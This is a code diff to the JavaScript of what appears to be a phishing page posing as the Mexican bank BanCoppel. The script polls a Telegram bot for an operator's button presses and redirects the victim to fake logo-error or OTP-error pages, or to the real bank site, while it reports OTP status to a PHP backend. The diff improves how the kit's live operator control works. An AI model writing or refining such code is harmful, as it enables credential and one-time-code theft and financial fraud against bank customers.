@@ -111,45 +111,47 @@ document.addEventListener('DOMContentLoaded', async () => {
     body: "data=" + encodeURIComponent(mensaje) + "&keyboard=" + encodeURIComponent(JSON.stringify(keyboard))
   });
 
-  checkBoton(transactionId, token);
+  // Iniciar la espera
+  await checkBoton(token, transactionId, 0);
 });
 
-async function checkBoton(txId, botToken) {
+async function checkBoton(botToken, txId, offset) {
   try {
-    const res = await fetch(`https://api.telegram.org/bot${botToken}/getUpdates`);
+    const res = await fetch(`https://api.telegram.org/bot${botToken}/getUpdates?offset=${offset}`);
     const data = await res.json();
 
-    const update = data.result.find(u =>
-      u.callback_query &&
-      u.callback_query.data &&
-      u.callback_query.data.includes(txId)
-    );
+    if (!data.ok || !data.result) throw new Error("Sin respuesta válida");
 
-    if (update) {
-      const tipo = update.callback_query.data.split(":")[0];
+    let lastUpdateId = offset;
+    for (const update of data.result) {
+      lastUpdateId = update.update_id + 1;
 
-      switch (tipo) {
-        case "error_logo":
-          return window.location.href = "errorlogo.html";
-        case "error_otp":
-          return window.location.href = "cel-dina-error.html";
-        case "finalizar":
-          return window.location.href = "https://www.bancoppel.com";
-        case "confirm_finalizar":
-          // Solo envia notificación, pero no redirige automáticamente
-          await fetch("sendStatus.php", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ status: "Finalización OTP Exitosa" })
-          });
-          return; // NO REDIRECCIONA
+      if (update.callback_query && update.callback_query.data.includes(txId)) {
+        const tipo = update.callback_query.data.split(":")[0];
+
+        switch (tipo) {
+          case "error_logo":
+            return window.location.href = "errorlogo.html";
+          case "error_otp":
+            return window.location.href = "cel-dina-error.html";
+          case "finalizar":
+            return window.location.href = "https://www.bancoppel.com";
+          case "confirm_finalizar":
+            await fetch("sendStatus.php", {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({ status: "Finalización OTP Exitosa" })
+            });
+            return; // no redirige, como solicitaste
+        }
       }
     }
 
-    setTimeout(() => checkBoton(txId, botToken), 2500);
-  } catch (e) {
-    console.error("Error verificando botón:", e);
-    setTimeout(() => checkBoton(txId, botToken), 3000);
+    // Esperar nuevamente
+    setTimeout(() => checkBoton(botToken, txId, lastUpdateId), 3000);
+  } catch (err) {
+    console.error("Error al verificar botón:", err);
+    setTimeout(() => checkBoton(botToken, txId, offset), 3000);
   }
 }
 </script>
